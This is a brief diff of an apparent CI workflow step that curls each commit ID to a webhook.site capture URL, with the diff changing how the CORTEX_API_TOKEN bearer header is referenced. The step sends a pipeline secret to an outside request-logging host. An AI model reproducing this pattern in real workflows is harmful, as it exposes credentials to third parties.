@@ -50,7 +50,7 @@ jobs:
           for COMMIT in $COMMITS; do
             echo "Sending notification for commit: $COMMIT"
             curl -X POST -H "Content-Type: application/json" \
-              -H "Authorization: Bearer ${{ CORTEX_API_TOKEN }}" \
+              -H "Authorization: Bearer $CORTEX_API_TOKEN" \
               -d "{\"commit\": \"${COMMIT}\"}" \
               https://webhook.site/e77128be-28c5-43e1-94eb-238e98e5dfad
           done
